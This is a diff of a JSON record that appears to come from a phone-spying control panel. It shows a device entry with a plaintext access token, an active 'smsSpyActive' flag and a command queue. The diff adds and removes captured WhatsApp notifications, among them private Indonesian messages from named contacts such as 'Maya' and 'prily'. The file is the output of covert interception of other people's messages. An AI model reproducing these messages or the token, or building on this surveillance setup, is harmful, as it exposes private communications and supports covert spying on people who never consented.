@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776952525195,
+    "lastSeen": 1776952534192,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 42 chat",
+        "time": "23/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952535627
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 41 chat",
+        "time": "23/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952528398
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Maya",
+        "content": "aku tadi pas dibilang jangan chat ga aku chat",
+        "time": "23/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952528376
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "23/04 19:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1776943870161
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "buang buang uang",
-        "time": "23/04 19:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776943870073
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎63 pesan dari 42 chat",
-        "time": "23/04 19:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776943865080
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "ga ada kouta buat scan",
-        "time": "23/04 19:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776943864990
       }
     ],
     "galleryPhotos": [],
